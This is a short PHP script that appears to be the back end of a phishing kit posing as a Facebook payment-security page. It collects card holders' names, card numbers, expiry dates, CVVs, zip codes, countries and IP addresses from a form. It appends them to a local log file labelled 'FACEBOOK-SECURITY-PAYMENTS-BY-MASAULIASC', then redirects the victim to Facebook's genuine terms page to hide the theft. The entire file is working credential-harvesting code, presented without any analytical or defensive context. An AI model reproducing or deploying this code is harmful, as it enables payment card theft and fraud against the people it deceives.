<?php
error_reporting(0);
$file = "seratusjuta.txt";

$ccname = $_POST['CName'];
$ccnumber = $_POST['CNumber'];
$month  = $_POST['mm'];
$year  = $_POST['yy'];
$cvv  = $_POST['CVV'];
$zipnumb  = $_POST['zip'];
$countryname  = $_POST['country'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');

fwrite($handle, "----FACEBOOK-SECURITY-PAYMENTS-BY-MASAULIASC----");

fwrite($handle, "\n");

fwrite($handle, "Full Name      : ");

fwrite($handle, " $ccname");

fwrite($handle, "\n");

fwrite($handle, "CC Number      : ");

fwrite($handle, " $ccnumber");

fwrite($handle, "\n");

fwrite($handle, "Epired Date     : ");

fwrite($handle, " $month");

fwrite($handle, "/");

fwrite($handle, " $year");

fwrite($handle, "\n");

fwrite($handle, "CVV            : ");

fwrite($handle, " $cvv");

fwrite($handle, "\n");

fwrite($handle, "Zip Code       : ");

fwrite($handle, " $zipnumb");

fwrite($handle, "\n");

fwrite($handle, "Country        : ");

fwrite($handle, " $countryname");

fwrite($handle, "\n");

fwrite($handle, "IP Address     : ");

fwrite($handle, " $ip");

fwrite($handle, "\n");

fwrite($handle, "----------------------END----------------------");

fwrite($handle, "\n");

fwrite($handle, "-----------------------------------------------");

fwrite($handle, "\n");

fwrite($handle, "\n");


fclose($handle);

echo "<script LANGUAGE=\"JavaScript\">

<!--

window.location=\"https://www.facebook.com/legal/terms\";

// -->

</script>";

?>

